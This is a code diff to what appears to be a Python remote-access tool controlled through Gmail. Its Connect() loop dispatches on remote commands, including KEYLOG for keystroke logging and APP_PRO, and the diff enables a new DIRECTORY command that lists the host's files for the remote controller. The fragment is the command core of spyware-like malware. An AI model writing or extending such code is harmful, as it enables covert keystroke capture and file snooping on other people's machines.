@@ -17,6 +17,7 @@ from requests import HTTPError
 import k as kls
 import app_process_server_gmail as ap
 import shutdown_logout_server_gmail as sl
+import directory_tree_server_gmail as dt
 
 # If modifying these scopes, delete the file token.json.
 SCOPES = [
@@ -148,7 +149,9 @@ def app_process():
 def shutdown_logout():
     sl.shutdown_logout()
     return
-
+def directory_tree():
+    dt.directory()
+    return
 
 def Connect():
     while True:
@@ -159,8 +162,8 @@ def Connect():
             mac_address()
         elif "KEYLOG" in cmd:
             key_logger()
-        # elif "DIRECTORY" in cmd:
-        #     directory_tree()
+        elif "DIRECTORY" in cmd:
+            directory_tree()
         # elif "LIVESCREEN" in cmd:
         #     live_screen()
         elif "APP_PRO" in cmd:
